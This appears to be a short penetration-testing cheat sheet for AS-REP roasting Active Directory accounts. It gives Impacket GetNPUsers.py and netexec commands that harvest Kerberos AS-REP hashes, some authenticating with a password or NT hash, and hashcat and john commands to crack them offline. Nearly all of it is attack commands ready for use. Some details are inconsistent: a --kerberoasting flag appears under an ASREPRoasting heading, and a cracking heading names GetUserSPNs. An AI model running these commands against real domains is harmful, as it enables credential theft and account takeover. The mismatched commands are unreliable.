# getnpusers
#plateform/linux #target/remote #cat/ATTACK

## ASREPRoast
```
GetNPUsers.py -usersfile <users_file|users.txt> -outputfile hashes.asreproast <domain>/
```

## ASREPRoasting with nxc
```
netexec ldap <TARGETS> -u <USER> -p <PASSWORD> --kerberoasting ASREPRoastables.txt --kdcHost <KeyDistributionCenter>
```

## ASREPRoasting users list dynamically queried with a LDAP authenticated bind (password)
```
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
```

## ASREPRoasting users list dynamically queried with a LDAP authenticated bind (NT hash)
```
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```


## Crack ASREPRoast
```
hashcat -m 18200 --force -a 0 <hash_file> </path/to/wordlist>
```

## crack GetUserSPNs using john
```
john --wordlist=$wordlist ASREProastables.txt
```

